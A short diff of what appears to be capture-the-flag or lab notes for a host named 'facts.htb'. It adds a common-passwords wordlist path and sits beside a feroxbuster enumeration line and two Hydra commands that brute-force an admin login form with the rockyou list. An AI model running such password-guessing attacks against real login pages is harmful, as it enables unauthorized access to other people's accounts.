@@ -17,9 +17,7 @@ feroxbuster -u ** -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words
 
 
 
-
-
-
 Hydra
+/usr/share/wordlists/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
 hydra -l admin -P /usr/share/wordlists/rockyou.txt facts.htb http-post-form "/admin/login:user[username]=^USER^&user[password]=^PASS^:F=Username or Password incorrect" -t 32 -V
 hydra -l admin -P /usr/share/wordlists/rockyou.txt facts.htb http-post-form "/admin/login:user[username]=^USER^&user[password]=^PASS^:S=302" -t 32 -V
